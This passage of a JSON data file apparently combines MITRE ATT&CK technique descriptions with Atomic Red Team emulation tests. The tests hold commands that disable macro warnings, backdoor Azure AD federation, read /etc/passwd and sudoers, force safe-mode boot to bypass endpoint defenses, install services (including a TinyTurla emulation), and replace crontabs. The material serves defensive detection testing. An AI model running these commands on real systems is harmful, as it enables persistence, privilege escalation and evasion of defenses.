"auto_generated_guid": "24fd9719-7419-42dd-bce6-ab3463110b3c", "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. \nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n", "supported_platforms": ["windows"], "executor": {"command": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\"", "cleanup_command": "reg delete \"HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\" /v \"VBAWarnings\" /f", "name": "powershell"}}]}, "T1592.001": {"name": "Hardware", "technique_id": "attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26", "external_id": "T1592.001", "data_components": ["Response Content"], "kill_chain_phases": ["reconnaissance"], "data_source_platforms": [], "mitigations": ["course-of-action--78bb71be-92b4-46de-acd6-5f998fedf1cc"], "description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).", "atomic_tests": [{"name": "Enumerate PlugNPlay Camera", "auto_generated_guid": "d430bf85-b656-40e7-b238-42db01df0183", "description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\"\n"}}]}, "T1484.002": {"name": "Domain Trust Modification", "technique_id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee", "external_id": "T1484.002", "data_components": ["Command Execution", "Active Directory Object Creation", "Active Directory Object Modification"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) ", "atomic_tests": [{"name": "Add Federation to Azure AD", "auto_generated_guid": "8906c5d0-3ee5-4f63-897a-f6cafd3fdbb7", "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n", "supported_platforms": ["azure-ad"], "input_arguments": {"azure_username": {"description": "Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles", "type": "string", "default": "bruce.wayne@contosocloud.com"}, "azure_password": {"description": "Password of azure_username", "type": "string", "default": "iamthebatman"}, "domain_name": {"description": "Malicious federated domain name", "type": "string", "default": "contoso.com"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AzureAD and AADInternals Powershell modules must be installed.\n", "prereq_command": "if ((Get-Module -ListAvailable -Name AzureAD) -And (Get-Module -ListAvailable -Name AADInternals)) {exit 0} else {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\nInstall-Module -Name AADInternals -Force\n"}], "executor": {"command": "Import-Module AzureAD\nImport-Module AADInternals\n\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n\ntry {\n  Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null\n}\ncatch {\n  Write-Host \"Error: AzureAD could not connect\"\n  exit 1\n}\n\ntry {\n  $domain = Get-AzureADDomain -Name \"#{domain_name}\"\n}\ncatch {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not found\"\n  exit 1\n}\nif (-Not $domain.IsVerified) {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" not verified\"\n  exit 1\n}\n\nif ($domain.AuthenticationType -eq \"Federated\") {\n  Write-Host \"Error: domain \"\"#{domain_name}\"\" already federated. Try with a different domain or re-create it before.\"\n  exit 1\n}\n\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\nif (-Not $at) {\n  Write-Host \"Error: AADInternals could not connect\"\n  exit 1\n}\n\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"#{domain_name}\"\nif ($new) {\n  Write-Host \"Federation successfully added to Azure AD\"\n  Write-Host $new\n}\nelse {\n  Write-Host \"The federation setup failed\"\n}\n\nWrite-Host \"End of federation configuration.\"\n", "cleanup_command": "try {\n  Import-Module AzureAD -ErrorAction Ignore\n\n  $PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\n  Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n  Remove-AzureADDomain -Name \"#{domain_name}\" -ErrorAction Ignore\n} catch {}\n", "name": "powershell"}}]}, "T1087.001": {"name": "Local Account", "technique_id": "attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e", "external_id": "T1087.001", "data_components": ["Process Creation", "OS API Execution", "Command Execution", "File Access", "Group Enumeration"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3"], "description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.", "atomic_tests": [{"name": "Enumerate all accounts (Local)", "auto_generated_guid": "f8aab3dd-5990-4bf8-b8ab-2226c951696f", "description": "Enumerate all accounts by copying /etc/passwd to another file\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1087.001.txt"}}, "executor": {"command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh"}}, {"name": "View sudoers access", "auto_generated_guid": "fed9be70-0186-4bde-9f8a-20945f9370c2", "description": "(requires root)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1087.001.txt"}}, "executor": {"command": "if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;\nif [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh", "elevation_required": true}}, {"name": "View accounts with UID 0", "auto_generated_guid": "c955a599-3653-4fe5-b631-f11c00eb0397", "description": "View accounts with UID 0\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1087.001.txt"}}, "executor": {"command": "grep 'x:0:' /etc/passwd > #{output_file}\ngrep '*:0:' /etc/passwd >> #{output_file}\ncat #{output_file} 2>/dev/null\n", "cleanup_command": "rm -f #{output_file} 2>/dev/null\n", "name": "sh"}}, {"name": "List opened files by user", "auto_generated_guid": "7e46c7a5-0142-45be-a858-1a3ecb4fd3cb", "description": "List opened files by user\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "username=$(id -u -n) && lsof -u $username\n", "name": "sh"}, "dependency_executor_name": "sh", "dependencies": [{"description": "check if lsof exists\n", "prereq_command": "which lsof\n", "get_prereq_command": "(which pkg && pkg install -y lsof)||(which yum && yum -y install lsof)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)\n"}]}, {"name": "Show if a user account has ever logged in remotely", "auto_generated_guid": "0f0b6a29-08c3-44ad-a30b-47fd996b2110", "description": "Show if a user account has ever logged in remotely\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1087.001.txt"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Check if lastlog command exists on the machine\n", "prereq_command": "if [ -x \"$(command -v lastlog)\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "sudo apt-get install login; exit 1;\n"}], "executor": {"command": "lastlog > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh"}}, {"name": "Show if a user account has ever logged in remotely (freebsd)", "auto_generated_guid": "0f73418f-d680-4383-8a24-87bc97fe4e35", "description": "Show if a user account has ever logged in remotely\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1087.001.txt"}}, "executor": {"command": "lastlogin > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh"}}, {"name": "Enumerate users and groups", "auto_generated_guid": "e6f36545-dc1e-47f0-9f48-7f730f54a02e", "description": "Utilize groups and id to enumerate users and groups\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "groups\nid\n", "name": "sh"}}, {"name": "Enumerate users and groups", "auto_generated_guid": "319e9f6c-7a9e-432e-8c62-9385c803b6f2", "description": "Utilize local utilities to enumerate users and groups\n", "supported_platforms": ["macos"], "executor": {"command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "name": "sh"}}, {"name": "Enumerate all accounts on Windows (Local)", "auto_generated_guid": "80887bec-5a9b-4efc-a81d-f83eb2eb32ab", "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n", "supported_platforms": ["windows"], "executor": {"command": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "name": "command_prompt"}}, {"name": "Enumerate all accounts via PowerShell (Local)", "auto_generated_guid": "ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b", "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup\n", "name": "powershell"}}, {"name": "Enumerate logged on users via CMD (Local)", "auto_generated_guid": "a138085e-bfe5-46ba-a242-74a6fb884af3", "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "query user\n", "name": "command_prompt"}}]}, "T1562.009": {"name": "Safe Mode Boot", "technique_id": "attack-pattern--28170e17-8384-415c-8486-2e6b294cb803", "external_id": "T1562.009", "data_components": ["Process Creation", "Windows Registry Key Creation", "Windows Registry Key Modification", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067"], "description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)", "atomic_tests": [{"name": "Safe Mode Boot", "auto_generated_guid": "2a78362e-b79a-4482-8e24-be397bce4d85", "description": "Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot", "supported_platforms": ["windows"], "executor": {"command": "bcdedit /set safeboot network", "cleanup_command": "bcdedit /deletevalue {current} safeboot", "name": "command_prompt", "elevation_required": true}}]}, "T1543.003": {"name": "Windows Service", "technique_id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32", "external_id": "T1543.003", "data_components": ["Process Creation", "Service Modification", "Windows Registry Key Creation", "Driver Load", "Windows Registry Key Modification", "Service Creation", "Command Execution", "OS API Execution"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--590777b3-b475-4c7c-aaf8-f4a73b140312", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).", "atomic_tests": [{"name": "Modify Fax service to run PowerShell", "auto_generated_guid": "ed366cde-7d12-49df-a833-671904770b9f", "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start Fax\n", "cleanup_command": "sc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" >nul 2>&1"}}, {"name": "Service Installation CMD", "auto_generated_guid": "981e2942-e433-44e9-afc1-8c957a1496b6", "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_path": {"description": "Name of the service binary, include path.", "type": "path", "default": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"}, "service_type": {"description": "Type of service. May be own|share|interact|kernel|filesys|rec|userown|usershare", "type": "string", "default": "Own"}, "startup_type": {"description": "Service start method. May be boot|system|auto|demand|disabled|delayed-auto", "type": "string", "default": "auto"}, "service_name": {"description": "Name of the Service", "type": "string", "default": "AtomicTestService_CMD"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Service binary must exist on disk at specified location (#{binary_path})\n", "prereq_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc.exe create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type}  type=#{service_type}\nsc.exe start #{service_name}\n", "cleanup_command": "sc.exe stop #{service_name} >nul 2>&1\nsc.exe delete #{service_name} >nul 2>&1\n"}}, {"name": "Service Installation PowerShell", "auto_generated_guid": "491a4af6-a521-4b74-b23b-f7b3f1ee9e77", "description": "Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_path": {"description": "Name of the service binary, include path.", "type": "path", "default": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"}, "service_name": {"description": "Name of the Service", "type": "string", "default": "AtomicTestService_PowerShell"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Service binary must exist on disk at specified location (#{binary_path})\n", "prereq_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n", "cleanup_command": "Stop-Service -Name \"#{service_name}\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='#{service_name}'\").Delete()}\ncatch {}\n"}}, {"name": "TinyTurla backdoor service w64time", "auto_generated_guid": "ef0581fd-528e-4662-87bc-4c2affb86940", "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n", "supported_platforms": ["windows"], "input_arguments": {"dllfilename": {"description": "It specifies Dll file to run as service", "type": "string", "default": "$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll"}}, "executor": {"command": "copy \"#{dllfilename}\" %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time", "cleanup_command": "sc stop W64Time\nsc.exe delete W64Time\ndel %systemroot%\\system32\\w64time.dll\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /f", "name": "command_prompt", "elevation_required": true}}, {"name": "Remote Service Installation CMD", "auto_generated_guid": "fb4151a2-db33-4f8c-b7f8-78ea8790f961", "description": "Download an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n", "supported_platforms": ["windows"], "input_arguments": {"binary_path": {"description": "Name of the service binary, include path.", "type": "path", "default": "PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe"}, "service_type": {"description": "Type of service. May be own,share,interact,kernel,filesys,rec,userown,usershare", "type": "string", "default": "Own"}, "startup_type": {"description": "Service start method. May be boot,system,auto,demand,disabled,delayed-auto", "type": "string", "default": "auto"}, "service_name": {"description": "Name of the Service", "type": "string", "default": "AtomicTestService_CMD"}, "remote_host": {"description": "Name of the remote endpoint", "type": "string", "default": "localhost"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Service binary must exist on disk at specified location (#{binary_path})\n", "prereq_command": "if (Test-Path \"#{binary_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{binary_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"#{binary_path}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc.exe \\\\#{remote_host} create #{service_name} binPath= \"#{binary_path}\" start=#{startup_type} type=#{service_type}\nsc.exe \\\\#{remote_host} start #{service_name}\n", "cleanup_command": "sc.exe \\\\#{remote_host} stop #{service_name} >nul 2>&1\nsc.exe \\\\#{remote_host} delete #{service_name} >nul 2>&1"}}]}, "T1497.001": {"name": "System Checks", "technique_id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6", "external_id": "T1497.001", "data_components": ["Command Execution", "OS API Execution", "Process Creation"], "kill_chain_phases": ["defense-evasion", "discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)", "atomic_tests": [{"name": "Detect Virtualization Environment (Linux)", "auto_generated_guid": "dfbd1a21-540d-4574-9731-e852bd6fe840", "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": true, "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;\nif (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n"}}, {"name": "Detect Virtualization Environment (FreeBSD)", "auto_generated_guid": "e129d73b-3e03-4ae9-bf1e-67fc8921e0fd", "description": "Detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": true, "command": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi\n"}}, {"name": "Detect Virtualization Environment (Windows)", "auto_generated_guid": "502a7dc4-9d6f-4d28-abf2-f0e84692562d", "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "$error.clear()\nGet-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue\nif($error) {echo \"Virtualization Environment detected\"}\n", "cleanup_command": "$error.clear()\n"}}, {"name": "Detect Virtualization Environment (MacOS)", "auto_generated_guid": "a960185f-aef6-4547-8350-d1ce16680d09", "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "elevation_required": false, "command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n"}}, {"name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)", "auto_generated_guid": "4a41089a-48e0-47aa-82cb-5b81a463bc78", "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n"}}]}, "T1053.003": {"name": "Cron", "technique_id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c", "external_id": "T1053.003", "data_components": ["Process Creation", "Command Execution", "Scheduled Job Creation", "File Modification"], "kill_chain_phases": ["execution", "persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ", "atomic_tests": [{"name": "Cron - Replace crontab with referenced file", "auto_generated_guid": "435057fb-74b1-410e-9403-d81baf194f75", "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"command": {"description": "Command to execute", "type": "string", "default": "/tmp/evil.sh"}, "tmp_cron": {"description": "Temporary reference file to hold evil cron schedule", "type": "path", "default": "/tmp/persistevil"}}, "executor": {"name": "sh", "command": "crontab -l > /tmp/notevil\necho 